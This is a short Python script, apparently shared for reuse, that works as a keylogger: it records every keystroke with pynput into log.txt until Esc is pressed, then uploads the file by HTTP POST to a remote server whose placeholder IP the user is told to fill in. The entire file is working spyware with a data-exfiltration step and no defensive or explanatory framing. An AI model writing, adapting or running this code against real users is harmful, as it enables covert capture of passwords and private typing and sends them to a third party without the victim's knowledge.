from pynput.keyboard import Listener , Key
import requests

def pressing(key):
    with open("log.txt","a") as fw:
        fw.write(str(key))

def releasing(key):
    if key==Key.esc:
        return False
    
def send_to_server():

    url = "http://192.168.X.X/datas/upload.php" # NOTE: You only need to change the 'url' variable to match your server's IP address.
                                                # Everything else in the code remains the same.(keep the path /datas/upload.php)

    files = {'file': open("log.txt", "rb")}

    response = requests.post(url, files=files)
    print(response.json())  


with Listener(on_press=pressing,on_release=releasing) as listner:
    with open("log.txt","w") as fc:
        pass
    listner.join()
    send_to_server()
